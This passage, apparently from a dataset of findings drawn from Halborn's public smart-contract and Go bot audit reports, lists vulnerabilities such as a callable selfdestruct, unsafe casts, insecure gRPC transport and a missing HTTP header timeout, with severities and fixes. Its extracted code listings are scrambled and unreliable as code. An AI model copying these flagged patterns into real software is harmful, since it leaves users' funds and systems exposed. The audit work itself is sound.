K S I R D E S A B N O I T C A S N A R T N I A H C K C O L B BLOCKCHAIN SOURCE BASED RISK FACTORS 30 ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Informational"]}, {"title": "TIMELOCK RISK ASSESSMENT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "Timelock is a fixed delay time that allows for some reaction time in the event of an unexpected change that is not agreed upon or malicious, and therefore it is possible to unlock the funds and secure them. Example Codes Without Timelock - Owner Action: WheyFarm.sol 31 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B Listing 7 1 MakerDAO - 4 hours Timelock 2 Uniswap - 48 hours Timelock 3 SushiSwap - 48 hours Timelock Uniswap Timelock SushiSwap Timelock Result: The assessment is considered successful since Centaur Swap does have three minutes settlement set on their smart contracts. The timelock is set by code, once set no one can reduce the waiting time if not allowed using a governance system, which in this case it is centralized using the onlyOnwer modifier. 32 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B NON-BLOCKCHAIN SOURCE BASED RISK FACTORS 33 ", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Informational"]}, {"title": "PRICE FEED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Financial Pentesting/CentaurSwap_Financial_Pentesting_Halborn_v1_1.pdf", "body": "An oracle is a technological methodology that converts external data sources into a format that can be used in a blockchain. This allows smart contracts to define state changes and trigger events on a blockchain based on outside external events and interact with the outside world. The problem with oracles is that they create centralized points of trust Since into systems that are meant to be trustless and decentralized. an oracle controls the input data into a smart contract, it therefore controls the operation of the smart contract as it responds to the input As an example, If one of oracle feeds incorrect pricing data, data. arbitrage trading bots will quickly complete huge volume transactions. Code Location: CentaurPool.sol Result: Due to oracles are a central point of failure, data sources can go offline and price calculation can cause low liquidity pairs and incorrect values. With the increasing number of oracles, the system design can get complicated and a centralized structure can be constructed. On the other hand, the increase in the number of oracles may cause the system As an example solution, The to be open to different attack vectors. 34 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B - N O N price feed should be obtained from the small group of privileged users. Therefore, an attacker could not directly change price feed via the integration. But, this solution methodology also has disadvantages. The protocol would not able to update the price in the times of protocol. Uniswap introduced new methodology named as Time-Weighted Average Price Oracle on the V2. (https://uniswap.org/docs/v2/core-concepts/oracles/) Time-Weighted Average Price Oracle oracle provides strong protection method to oracle manipulation attacks. However, there are problems in providing a quick feed on this method as well. Although, Chainlink is used as an external oracle in the CentaurSwap contracts, implementing your own oracle will minimize attack surfaces. 35 S R O T C A F K S I R D E S A B E C R U O S N I A H C K C O L B - N O N THANK YOU FOR CHOOSING", "labels": ["Halborn", "CentaurSwap_Financial_Pentesting_Halborn_v1_1", "Severity: Medium"]}, {"title": "USAGE OF SELF", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The usage of the selfdestruct function erases the contract code from the blockchain. Although it is understandable under certain circumstances, this function if executed inappropriately can lead to the destruction of the token contract making users loose all the deposited money and making the decentralized application broken. Code Location: Listing 1: StakeBNBToken.sol 125 function selfDestruct ( address addr ) external onlyRole (  DEFAULT_ADMIN_ROLE ) whenPaused { selfdestruct ( payable ( addr )) ; } 126 127 Risk Level: Likelihood - 3 Impact - 3 Recommendation: Do not implement the self-destruct without checking users funds has been given back. Remediation Plan: The us- SOLVED: ing ID d059bccbb368158a63767107b37894d47009c385. As a result, this gives time persistenceOne team from fixed openzeppelin timelockcontract by commit above on issue the the the 13 to the users to call the withdraw function in case the self-destruct function is triggered. Moreover, the persistenceOne team ensures that this function will only be called in case a major upgrade occurs on the Binance ecosystem and gets the compromise to re-balance the stkBNB tokens to every user account if this situation happens. 14 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Medium"]}, {"title": "IMPROPER CHECK ON CLAIM FUNCTION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The **_claim** function checks the amount to withdraw from the protocol is less than the current contract balance. However, this check is not correct, and it can lead to revert the transaction as the claimReserve can be 0, although the contract balance is not 0. So on the subtraction on L786, the contract reverts with an unhandled arithmetic exception. Code Location: Listing 2: StakePool.sol 781 if ( address ( this ). balance < req . weiToReturn ) { 782 783 } revert InsufficientFundsToSatisfyClaim () ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: Check that the amount to be returned is less than the claimReserve. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 15 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Low"]}, {"title": "UNSAFE CASTING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The StakePool contracts performs unsafe casting from uint256 to int256 that can lead to overflow. Although the risk is minimum as the amount of BNB is still far from reaching those numbers. Code Location: Listing 3: StakePool.sol 560 if ( _bnbToUnbond > int256 ( excessBNB )) { Listing 4: StakePool.sol 569 _bnbToUnbond -= int256 ( shortCircuitAmount ); Listing 5: StakePool.sol 621 _bnbToUnbond -= int256 ( bnbUnbonding_ ); Listing 6: StakePool.sol 744 _bnbToUnbond += int256 ( weiToReturn ); Risk Level: Likelihood - 1 Impact - 3 Recommendation: To safely avoid the unlikely situation, it is recommended to use the SafeCast library from OpenZeppelin. 16 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. The final implementation con- tains the recommended library to avoid overflows on arithmetic operations when casting. 17 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Low"]}, {"title": "FEE VAULT SHOULD NOT BE ABLE TO SEND TOKENS TO STAKEPOOL CONTRACT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The claimStkBNB function from the FeeVault contract can send the fees Although this action is restricted by the to the StakePool contract. onlyOwner modifier, this action may lead the fees to be locked on the StakePool contract forever. This happens because there is no way to call the claim function from the FeeVault contract. Code Location: Listing 7: FeeVault.sol IStakedBNBToken ( addressStore . getStkBNB () ). send ( recipient , 75 function claimStkBNB ( address recipient , uint256 amount ) external  override onlyOwner { 76  amount , \" \"); 77 78 79 emit Withdraw ( msg . sender , recipient , amount ); } Risk Level: Likelihood - 1 Impact - 3 Recommendation: Ensure that the recipient address is not the stakepool contract to avoid a possible situation where funds maybe locked in the contract. 18 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 19 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Low"]}, {"title": "USE CALL INSTEAD OF SEND OR TRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The usage of send or transfer limits the amount of gas send in the trans- action to 2300. This can be considered a safeguard to avoid reentrancy. However, given the current protections of the contracts, it does seem feasible to use call function without further risk. This implies that the system expects to be used by some contracts that can execute more complex code on the fallback function. Code Location: Listing 8: StakePool.sol (Line 793) 770 771 772 773 774 775 776 777 778 779 780 781 782 783 784 785 786 787 788 function _claim ( uint256 index ) internal returns ( bool ) { if ( index >= claimReqs [ msg . sender ]. length ) { revert IndexOutOfBounds ( index ); } // find the requested claim ClaimRequest memory req = claimReqs [ msg . sender ][ index ]; if (! _canBeClaimed ( req )) { return false ; } if ( _claimReserve < req . weiToReturn ) { revert InsufficientFundsToSatisfyClaim () ; } // update _claimReserve _claimReserve -= req . weiToReturn ; // delete the req , as it has been fulfilled ( swap deletion  for O (1) compute ) 789 claimReqs [ msg . sender ][ index ] = claimReqs [ msg . sender ][  claimReqs [ msg . sender ]. length - 1]; 790 791 claimReqs [ msg . sender ]. pop () ; 20 792 793 794 795 796 } // return BNB back to user payable ( msg . sender ). transfer ( req . weiToReturn ); emit Claim ( msg . sender , req , block . timestamp ); return true ; Risk Level: Likelihood - 3 Impact - 1 Recommendation: If the Persistence team consider it appropriate, change the transfer function to call function to allow contracts to execute code in the fallback function. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 21 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Low"]}, {"title": "MISSING TWO", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The AddressStore contract use Ownable from OpenZeppelin which is a simple mechanism to transfer the ownership not supporting a two-step transfer ownership pattern. Ownable is a simpler mechanism with a single owner role that can be assigned to a single account. This simpler mechanism can be useful for quick tests, but projects with production concerns are likely to outgrow it. Transferring ownership is a critical operation and this could lead to transferring it to an inaccessible wallet or renouncing the ownership, e.g. mistakenly. Code Location: AddressStore Contract Listing 9: AddressStore.sol 8 contract AddressStore is IAddressStore , Ownable Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to implement a two-step transfer of ownership mechanism where the ownership is transferred and later claimed by a new owner to confirm the whole process and prevent lockout. As OpenZeppelin ecosystem does not provide such implementation, it has to be done in-house. For the 22 inspiration BoringOwnable can be considered, however it has to be well tested, especially if it is integrated with other OpenZeppelin contracts used by the project. References - Access Control - BoringOwnable.sol Remediation Plan: SOLVED: The persistenceOne team does not require a fix for this, as the platform will use a multi-signature wallet when developed on production. 23 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Informational"]}, {"title": "STORING VARIABLE CAN SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Calling a contract, although a view function, still requires some gas from the contract. The UndelegationHolder contract performs the call to the StakePool contract twice instead of storing the result on a variable. Risk Level: Likelihood - 1 Impact - 1 Code Location: UndelegationHolder contract Listing 10: UndelegationHolder.sol 66 if ( amountToSend > IStakePoolBot ( stakePool ). bnbUnbonding () ) { 67 68 } amountToSend = IStakePoolBot ( stakePool ). bnbUnbonding () ; Recommendation: Store the result of the function call in a variable and use the stored value in subsequent operations. Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 24 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Informational"]}, {"title": "ADDING UNCHECKED DIRECTIVE CAN SAVE GAS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "For the arithmetic operations that will never over/underflow, using the unchecked directive (Solidity v0.8 has default overflow/underflow checks) can save some gas from the unnecessary internal over/underflow checks. Risk Level: Likelihood - 1 Impact - 1 Code Location: StakePool contract Listing 11: StakePool.sol 539 _TOKEN_HUB . transferOut { value : excessBNB }( 540 541 542 543 544 ); _ZERO_ADDR , config . bcStakingWallet , transferOutAmount , uint64 ( block . timestamp + 3600) Recommendation: Using the unchecked keyword to avoid redundant arithmetic checks and save gas when an underflow/overflow cannot happen. 25 Remediation Plan: ACKNOWLEDGED: The persistenceOne team acknowledged this issue. 26 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Informational"]}, {"title": "PREFIX INCREMENTS ARE CHEAPER THAN POSTFIX INCREMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Persistence_StkBNB_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The function getPaginatedClaimRequests uses i++ which costs more gas than ++i, especially in a loop. In the loops below, postfix (e.g. i++) operators were used to increment or decrement variable values. It is known that, in loops, using prefix operators (e.g. ++i) costs less gas per iteration than using postfix operators. Risk Level: Likelihood - 1 Impact - 1 Code Location: StakePool Contract Listing 12: StakePool.sol 722 for ( uint256 i = 0; i < to - from ; i ++) { 723 724 } paginatedClaimRequests [ i] = claimReqs [ user ][ from + i ]; Recommendation: It is recommended to use unchecked ++i and --j operations instead of i++ and j-- to increment or decrement the values of uint variables within loops. This applies not only to iterator variables, but also to increments and decrements performed within loop code blocks. 27 Remediation Plan: SOLVED: The persistenceOne team fixed the above issue on the commit ID d059bccbb368158a63767107b37894d47009c385. 28 ", "labels": ["Halborn", "Persistence_StkBNB", "Severity: Informational"]}, {"title": "BOT INCONSISTENTLY CAN FAIL DUE TO MISSING CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "On the SuperNova Bot, several actions can be completed through the binary. In the Supernova protocol, The oracle module manages the status of the zones associated. The status includes the amount of coins delegated to the Zones Validator, block height, proof. With UpdateChainState message, oracle module updates the status of the zones stored in Oracle with a new status. In the SuperNova Bot, Transaction error is not defined for UpdateChainState message by the BOT. The bot can fail silently due to missing control. Code Location: /logic/router.go#L11 Listing 1 case config . ActStake : initialBanner ( botType ) switch botType { case config . ActOracle : cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) defer utils . CloseGrpc ( cq . ClientConn ) UpdateChainState ( cq , b , hci ) 1 func RouteBotAction ( botType string , b * basetypes . Bot , cni * config .  ChainNetInfo , hci * config . HostChainInfo ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( cq . ClientConn ) defer utils . CloseGrpc ( nq . ClientConn ) IcaAutoStake (cq , nq , b , hci ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( nq . ClientConn ) IcaStake ( nq , b , hci ) case config . ActAutoStake : case config . ActWithdraw : 14 cq := query . NewCosmosQueryClient ( hci . GrpcAddr ) nq := novaq . NewNovaQueryClient ( cni . GRPC . Host ) defer utils . CloseGrpc ( cq . ClientConn ) defer utils . CloseGrpc ( nq . ClientConn ) UndelegateAndWithdraw (cq , nq , b , hci ) default : panic ( \" This type cannot handle at this action router \") 19 20 21 22 23 24 25 26 Risk Level: Likelihood - 3 Impact - 5 Proof Of Concept: Listing 2 addr := sdk . AccAddress ([] byte ( \" addr________________ \" )) sdk . NewCoin (\" atom \" , sdk . NewInt (1000) ) , addr . String () , msg := MsgUpdateChainState { Coin : Operator : BlockHeight : 10 , AppHash : ZoneId : 1 func TestMsgUpdateChainStateValidation ( t * testing .T ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } // check invalid address msg . Operator = \" invalid \" err = msg . ValidateBasic () require . Error (t , err ) } err := msg . ValidateBasic () require . NoError (t , err ) [] byte ( \" apphash \" ) , \" cosmos \" , /client/base/bot.go#L88 15 Listing 3 return NEXT return NEXT \" , ut . KEEP ) if e != nil { There is no asset to There is no reward to utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" go to next batch \\ n\" , ut . KEEP ) go to next batch \\n \" , ut . KEEP ) } else if strings . Contains ( e. Error () , \" no coins to } else if strings . Contains ( e. Error () , \" invalid coins \") { } else if strings . Contains ( e. Error () , \" cannot change state if strings . Contains ( e . Error () , \" account sequence mismatch \" utils . LogErrWithFd (f , e , \" return SEQMISMATCH 1 func handleTxErr ( f * os . File , e error ) TxErr { 2 3  ) { 4 5 6  \" ) { 7  delegate on this host zone 8 9 10  autostake on this host zone 11 12  undelegate \" ) { 13  undelegate on this host zone 14 15  funds \" ) { 16  withdraw on this host zone 17 18  height must be higher than the previous block height \" ) { 19  due to the oracle bot 's update . It will regenerate tx \\ n\" , ut . KEEP ) 20 21 22 23  generate tx \" , ut . KEEP ) 24 25 26 27 } There is no asset to go to next batch \\ n \" , ut . KEEP ) } else if strings . Contains ( e. Error () , \" cannot withdraw } else if strings . Contains ( e. Error () , \" current block go to next batch \\ n\" , ut . KEEP ) } return NONE utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" utils . LogErrWithFd (f , e , \" something went wrong while oracle info was outdated There is no asset to return NORMAL return REPEAT return NEXT return NEXT } 16 Recommendation: Make sure all errors are handled in transactions. Listing 4 ErrUnknown ErrNotFoundZoneInfo = sdkerrors . Register ( ModuleName , 2, \" = sdkerrors . Register ( ModuleName , 1, \" = sdkerrors . Register ( ModuleName , 0, \" 1 var ( 2 ErrNoSupportChain  this chain is not supported \" ) 3 ErrInvalidOperator  invalid operator address \" ) 4  unknown error \" ) 5  not found zone info \" ) 6 ErrInvalidKeyManager  invalid key manager address \" ) 7  blockHeight must be positive \" ) 8 ErrInvalidBlockHeight  current block height must be higher than the previous block height  . \") 9 ) ErrNegativeBlockHeight = sdkerrors . Register ( ModuleName , 5, \" = sdkerrors . Register ( ModuleName , 6, \" = sdkerrors . Register ( ModuleName , 4, \" = sdkerrors . Register ( ModuleName , 3, \" Remediation Plan: SOLVED: The A41 team solved the issue in commit a6a44a376 by adding the error messages. 17 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: High"]}, {"title": "LACK OF ERROR CHECKS CAN LEADS TO UNEXCEPTED FAILURES ON THE BOT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "In the SuperNova Bot, the following actions can be completed through the bot. Listing 5 1 oracle : Update host 's base token price every 15 minutes . 2 3 withdraw : Undelegate and withdraw token from host account to nova  . The interval depends on the rules of the host chain . 4 5 stake : Delegate the tokens sent by the user to the host chain via  IBC to the a4x validator through the controller account every 10  mintues . 6 7 restake : Automatically re - stake the host account 's rewards  through IBC . The amount to be re - deposited is inquired from the  distribution module of the host chain every 6 hours . There are some instances where error handling has not been implemented for the functions that might return an error. Without the error handling, the operations can silently fail and cant continue the workflow. Code Location: /logic/tx.go#L82-L157 Listing 6 1 func UpdateChainState ( cq * query . CosmosQueryClient , b * novatypes .  Bot , host * config . HostChainInfo ) { 2 3 i := 0 intv := time . Duration ( b. Interval ) 18 } } for { _ = mustExecTx (b , host , msgs ) _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . 4 5 6 7 } 8 9 func IcaAutoStake ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 10 ... 11  ActAutoStake , targetSeq }) 12 ... 13 14 15 func IcaAutoStake ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 16 ... 17  ActAutoStake , targetSeq }) 18 ... 19 20 21 func IcaStake ( nq * novaq . NovaQueryClient , b * novatypes . Bot , host *  config . HostChainInfo ) { 22 ... 23  ActStake , targetSeq }) 24 ... 25 26 27 func UndelegateAndWithdraw ( cq * query . CosmosQueryClient , nq * novaq .  NovaQueryClient , b * novatypes . Bot , host * config . HostChainInfo ) { 28 ... 29  ActWithdraw , wdSeq }) 30 ... 31 _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . _ = mustExecTx (b , host , msgs , IBCConfirm { nq , config . }() } } Risk Level: Likelihood - 3 Impact - 5 19 Proof Of Concept: Listing 7 addr := sdk . AccAddress ([] byte ( \" addr________________ \" )) sdk . NewCoin (\" atom \" , sdk . NewInt (1000) ) , addr . String () , msg := MsgUpdateChainState { Coin : Operator : BlockHeight : 10 , AppHash : ZoneId : 1 func TestMsgUpdateChainStateValidation ( t * testing .T ) { 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 } // check invalid address msg . Operator = \" invalid \" err = msg . ValidateBasic () require . Error (t , err ) } err := msg . ValidateBasic () require . NoError (t , err ) [] byte ( \" apphash \" ) , \" cosmos \" , Recommendation: It is recommended to implement proper error checking to avoid unexpected crashes. Remediation Plan: SOLVED: The A41 team solved the issue in commit a6a44a376 by adding the error checks. 20 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: High"]}, {"title": "ReadHeaderTimeout IS NOT SET IN THE HTTP SERVE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "Slowloris is a type of denial of service (DoS) attack tool which allows a single machine to take down another machines web server with minimal bandwidth and side effects on unrelated services and ports. Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections Configuring to the target web server and sending a partial request. ReadHeaderTimeout would protect directly against this attack by closing the connection once the deadline is reached. By default, Go does not define any value meaning there is no timeout. Code Location: /api/server.go#L54 Listing 8 1 func ( s Server ) On ( addr string ) { 2 3 4 5 6 7 } 8 http . Handle (\" / metrics \" , promhttp . Handler () ) http . Handle (\" / check /\" , NewChkHandler () ) err := http . ListenAndServe ( addr , nil ) utils . CheckErr ( err , \" cannot open http server \" , ut . EXIT ) Risk Level: Likelihood - 3 Impact - 3 21 Proof Of Concept: Recommendation: It is recommended to define ReadHeaderTimeout in the API. Remediation Plan: SOLVED: The A41 team solved the issue in commit 5165f8b7e by adding ReadHeaderTimeout in the API. 22 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Medium"]}, {"title": "IBC TIMEOUT IS NOT COMPATIBLE WITH THE CHAIN", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "In the codebase, it is mentioned as This value must be set higher than the IBC timeout, but the value is incompatible with SuperNova Chain. The incompatibility can lead to error on the transaction generation. Code Location: /logic/params.go#L9 Listing 9 \" time \" 1 package logic 2 3 import ( 4 5 ) 6 7 const ( 8 9  higher than the ibc timeout . 10 ) 11 12 const ( 13 14 ) 15 QueryErrPrefix = \" [ QUERY ERROR ] : \" ReQueryDelay = time . Second * 1 IBCDelay = time . Second * 30 // This value must be set Risk Level: Likelihood - 1 Impact - 3 23 Recommendation: Ensure that IBCDelay is compatible with SuperNova Chain. Remediation Plan: SOLVED: The A41 team solved the issue in commit 41700f77 by adding IBC Timeout as a flag. 24 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Low"]}, {"title": "TEST DOCKER IMAGE RUNNING AS ROOT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "Docker containers generally run with root privileges by default. This allows for unrestricted container management, meaning a user could in- stall system packages, edit configuration files, bind privileged ports, etc. During static analysis, it was observed that the docker image is maintained through the root user. Code Location: Dockerfile Listing 10 1 FROM golang :1.19 - alpine AS builder 2 3 FROM builder AS builder - amd64 4 ARG arch = x86_64 5 6 FROM builder AS builder - arm64 7 ARG arch = aarch64 8 9 FROM builder - $TARGETARCH AS release 10 RUN set - eux ; apk add --no - cache ca - certificates build - base ; 11 RUN apk add git 12 ARG GHTOKEN 13 RUN git config -- global url . \" https :// $GHTOKEN@github . com / \".  insteadOf \" https :// github . com /\" && go env -w GOPRIVATE = github . com /  Carina - labs 14 WORKDIR / workspace 15 COPY . . 16 ADD https :// github . com / CosmWasm / wasmvm / releases / download / v1 .1.1/  libwasmvm_muslc . aarch64 .a / lib / libwasmvm_muslc . aarch64 .a 17 ADD https :// github . com / CosmWasm / wasmvm / releases / download / v1 .1.1/  libwasmvm_muslc . x86_64 . a / lib / libwasmvm_muslc . x86_64 . a 18 RUN sha256sum / lib / libwasmvm_muslc . aarch64 . a | grep 9  ecb037336bd56076573dc18c26631a9d2099a7f2b40dc04b6cae31ffb4c8f9a 25 19 RUN sha256sum / lib / libwasmvm_muslc . x86_64 . a | grep 6  e4de7ba9bad4ae9679c7f9ecf7e283dd0160e71567c6a7be6ae47c81ebe7f32 20 RUN cp / lib / libwasmvm_muslc . $ { arch }. a / lib / libwasmvm_muslc . a 21 RUN LINK_STATICALLY = true make build 22 23 FROM alpine :3.16 24 RUN apk add -- update --no - cache 25 ENV TARGET = hal 26 ENV PATH = \"$ { PATH }:/ workspace \" 27 WORKDIR / workspace 28 COPY -- from = release / workspace / build / $TARGET ./ $TARGET 29 # comment out below if you need config dynamic linking 30 COPY . chaininfo . yaml . secret . yaml ./ config / 31 CMD [\" hal \" , \" -- help \" ] ca - certificates libstdc ++ yq Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to build the Dockerfile and run the container as a non-root user. Listing 11: Reference 1 USER 1001: this is a non - root user UID , and here it is assigned to  the image to run the current container as an unprivileged user .  By doing so , the added security and other restrictions mentioned  above are applied to the container . Remediation Plan: SOLVED: The A41 team solved the issue in commit 273c89b by changing user on the Dockerfile. 26 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Low"]}, {"title": "USE OF WEAK RANDOM GENERATOR", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "When a non-cryptographic PRNG is used in a cryptographic context, it can expose the cryptography to certain types of attacks. Often a pseudo-random number generator (PRNG) is not designed for cryptography. Sometimes a poor source of randomness is enough or preferable for algorithms that use random numbers. Weak generators generally take less processing power and/or do not use the precious, finite, entropy sources on a system. While such PRNGs might have very useful features, these same features could be used to break the cryptography. Code Location: /rpc/types/ws.go#L8-L9 Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider replacing math/rand with crypto/rand. Remediation Plan: SOLVED: The A41 team solved the issue in commit 138541f by using crypto /rand. 27 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Low"]}, {"title": "SECRET YAML SHOULD BE ADDED INTO GIT IGNORE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": ".secret.yml is used to pipe keyring password. A gitignore file specifies intentionally untracked files that Git should ignore. All sensitive information should be added into the gitignore to prevent commit into repository. Code Location: /.secret.yaml Listing 12: Reference 1 pw : masked Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider removing .secret.yml and adding it to .gitignore. Remediation Plan: SOLVED: The A41 team solved the issue in commit 8cc34a0d by adding . secret.yml into .gitignore. 28 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Low"]}, {"title": "HARDCODED USE OF INSECURE GRPC TRANSPORT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "During the code review, it was noted that gRPC client uses a hardcoded WithInsecure() transport setting when dialing a remote. This could allow man-in-the-middle attacks between the gRPC client and server. Code Location: /client/nova/query/querier.go#L30 Listing 13 conn , err := grpc . Dial ( grpcAddr , grpc . WithInsecure () , 1 func NewNovaQueryClient ( grpcAddr string ) * NovaQueryClient { 2 3 4 5 6 7 8 } ) utils . CheckErr ( err , \" cannot create gRPC connection \" , 0) return & NovaQueryClient { conn } Risk Level: Likelihood - 1 Impact - 3 Recommendations: In the short term, add documentation that explains to end users the simplest mechanism to secure gRPC. In the long term, consider adding a configuration option that allows you to select gRPC transport as secure or non-secure, where secure transport is the default. 29 Remediation Plan: SOLVED: The A41 team solved the issue in commit 576ac33 by adding secure option. 30 ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Low"]}, {"title": "LACK OF EXTENSIVE TEST COVERAGE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/A41_SuperNova_Bot_Golang_Security_Audit_Report_Halborn_Final.pdf", "body": "Adequate test coverage and regular reporting is an essential process to ensure the codebase works as intended. Insufficient code coverage can lead to unexpected issues and regressions due to changes in module implementations. Code Location: SuperNova Bot Recommendation: Make sure the coverage report produced via go test -cover covers all functions. Remediation Plan: ACKNOWLEDGED: The A41 team acknowledged this issue. 31 3.10 (HAL-10) OPEN TODO IN CODEBASE - INFORMATIONAL ", "labels": ["Halborn", "A41_SuperNova_Bot_Golang", "Severity: Informational"]}, {"title": "IMPROPER KEY MANAGEMENT POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Pera_Finance_SmartContract_Halborn_report_v1_1.pdf", "body": "A fundamental principle of blockchain is decentralization which should be applied as widely as possible in all areas, including key management. Using a single private key to manage a smart contract and perform privi- leged actions such as deploying or upgrading the contract is risky. If the private key is compromised, it could have devastating consequences. For example, on March 5, 2021, the PAID Network smart contract was suc- cessfully attacked despite the smart-contract being previously audited. Approximately $100 million of PAID tokens were extracted by the attacker. In that case, the private key was compromised and the attacker upgraded and replaced the original smart contract with a malicious version that allowed tokens to be burned and minted. Had best practices been imple- mented in the key management policy, the attacker could not have upgraded the contract using a single private key. Requiring multiple signatures in the key-management policy prevents a single user from performing any critical actions. Reference: https://halborn.com/explained-the-paid-network-hack-march -2021/ Risk Level: Likelihood - 5 Impact - 5 Recommendations: Require multiple signatures in the key-management policy to avoid a private-key compromise resulting in loss of control over the smart con- tract. 13 Remediation Plan: SOLVED: Pera.Finance Team will use a multi-signature wallet for the deployment to the mainnet. 14 ", "labels": ["Halborn", "Pera_Finance_SmartContract_Halborn_report_v1_1", "Severity: Critical"]}, {"title": "IMPROPER ROLE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract 